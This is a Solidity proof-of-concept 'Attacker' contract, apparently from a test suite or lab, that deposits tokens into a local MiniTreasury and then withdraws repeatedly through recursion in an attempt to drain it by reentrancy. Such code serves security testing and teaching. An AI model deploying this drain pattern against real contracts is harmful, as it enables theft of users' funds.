// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./MiniTreasury.sol";
import {ERC20} from "../lib/solmate/src/tokens/ERC20.sol";

contract Attacker {
    MiniTreasury public treasury;
    address public token;

    constructor(address _treasury, address _token) {
        treasury = MiniTreasury(_treasury);
        token = _token;
    }

    function deposit(uint256 amount) external {
        ERC20(token).approve(address(treasury), type(uint256).max);
        // Deposit ERC20 tokens to the treasury
        treasury.depositERC20(token, amount);
    }

    function attack(uint256 amount) public {
        // Attempt to withdraw tokens to trigger reentrancy
        treasury.withdrawERC20(token, amount);
        withdraw();
    }

    function withdraw() internal {
        if (ERC20(token).balanceOf(address(treasury)) > 0) {
            attack(1);
        }
    }
}